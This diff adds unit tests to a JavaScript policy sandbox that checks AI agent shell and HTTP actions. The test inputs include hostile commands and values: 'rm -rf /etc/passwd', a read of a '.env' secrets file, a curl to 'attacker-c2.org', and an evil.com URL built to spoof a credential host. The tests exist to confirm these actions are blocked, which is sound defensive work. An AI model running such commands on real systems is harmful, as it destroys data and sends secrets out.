@@ -169,5 +169,70 @@ describe('Strands Box & Dogwood Policy Diode', () => {
     assert.ok(textOut.includes('Strands Box & Multi-Harness Doctor'));
     assert.ok(textOut.includes('HEALTHY'));
   });
+
+  test('decomposes prefixed commands and system subpath deletions', () => {
+    const session = createBoxSession({ name: 'prefix-box' });
+    const res = evaluateBoxAction(session, {
+      type: EVENT_SHELL_EXEC,
+      target: 'sudo /bin/rm -rf /etc/passwd'
+    });
+    assert.equal(res.allowed, false);
+    assert.equal(res.decision, 'BLOCK');
+    assert.equal(res.reason, 'CRITICAL_DELETION_CONTAINMENT_BREACH');
+  });
+
+  test('shell reads of sensitive files taint session and block exfiltration', () => {
+    const session = createBoxSession({ name: 'shell-read-taint-box', workspace: '/workspace' });
+    assert.equal(session.isTainted, false);
+
+    const readRes = evaluateBoxAction(session, {
+      type: EVENT_SHELL_EXEC,
+      target: 'cat /workspace/.env'
+    });
+    assert.equal(readRes.allowed, true);
+    assert.equal(session.isTainted, true);
+
+    const exfilRes = evaluateBoxAction(session, {
+      type: EVENT_SHELL_EXEC,
+      target: 'curl https://attacker-c2.org/stolen'
+    });
+    assert.equal(exfilRes.allowed, false);
+    assert.equal(exfilRes.decision, 'BLOCK');
+    assert.equal(exfilRes.reason, 'EXFILTRATION_DIODE_TRIGGERED');
+  });
+
+  test('rate limits keyed by default or http:request are shared across query strings', () => {
+    const session = createBoxSession({
+      name: 'shared-rate-box',
+      rateLimits: {
+        'http:request': { maxCount: 2, windowSeconds: 60 }
+      }
+    });
+
+    const res1 = evaluateBoxAction(session, { type: EVENT_HTTP_REQUEST, target: 'https://example.com/api?q=1' });
+    assert.equal(res1.allowed, true);
+    const res2 = evaluateBoxAction(session, { type: EVENT_HTTP_REQUEST, target: 'https://example.com/api?q=2' });
+    assert.equal(res2.allowed, true);
+    const res3 = evaluateBoxAction(session, { type: EVENT_HTTP_REQUEST, target: 'https://example.com/api?q=3' });
+    assert.equal(res3.allowed, false);
+    assert.equal(res3.reason, 'RATE_LIMIT_EXCEEDED');
+  });
+
+  test('credential injection compares exact host and rejects query string spoofing', () => {
+    const session = createBoxSession({
+      name: 'spoof-cred-box',
+      credentialRoutes: [
+        { match: 'api.github.com', header: 'Authorization', inject: 'Bearer vault_token_real' }
+      ]
+    });
+
+    const attackRes = evaluateBoxAction(session, {
+      type: EVENT_HTTP_REQUEST,
+      target: 'https://evil.com/?x=api.github.com',
+      params: { headers: { Authorization: 'Bearer placeholder' } }
+    });
+    assert.equal(attackRes.injectedAuth, false);
+    assert.equal(attackRes.transformedParams, undefined);
+  });
 });
 
